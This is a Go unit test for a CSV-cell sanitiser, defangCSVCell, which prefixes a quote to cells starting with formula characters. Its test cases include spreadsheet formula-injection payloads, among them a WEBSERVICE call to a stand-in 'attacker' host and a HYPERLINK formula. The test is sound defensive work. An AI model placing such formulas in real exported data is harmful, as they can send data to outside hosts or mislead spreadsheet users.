package handlers

import "testing"

func TestDefangCSVCell(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"empty", "", ""},
		{"plain", "alice@example.com", "alice@example.com"},
		{"equals", "=1+1", "'=1+1"},
		{"plus", "+cmd", "'+cmd"},
		{"minus", "-2", "'-2"},
		{"at", "@SUM(A1)", "'@SUM(A1)"},
		{"tab", "\tfoo", "'\tfoo"},
		{"carriage_return", "\rfoo", "'\rfoo"},
		{"hyperlink_attack", `=HYPERLINK("http://x","x")`, `'=HYPERLINK("http://x","x")`},
		{"webservice_attack", `=WEBSERVICE("https://attacker/x")`, `'=WEBSERVICE("https://attacker/x")`},
		{"safe_leading_letter", "Alice", "Alice"},
		{"safe_leading_digit", "2026-05-15", "2026-05-15"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			if got := defangCSVCell(tc.in); got != tc.want {
				t.Errorf("defangCSVCell(%q) = %q, want %q", tc.in, got, tc.want)
			}
		})
	}
}
